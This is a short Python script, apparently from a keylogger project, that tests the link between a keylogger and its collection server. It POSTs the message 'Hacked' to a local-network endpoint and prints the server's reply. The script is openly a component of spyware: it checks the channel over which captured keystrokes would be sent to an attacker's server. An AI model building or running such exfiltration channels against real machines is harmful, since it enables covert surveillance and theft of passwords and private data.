import requests

'''
This is a test file to check connection between server and keylogger
'''

url = 'http://192.168.0.90:5000/data' # example url use original as shown in othe file

payload = {'message':"Hacked"}

response = requests.post(url,json=payload)
print("Server respond",response.text)
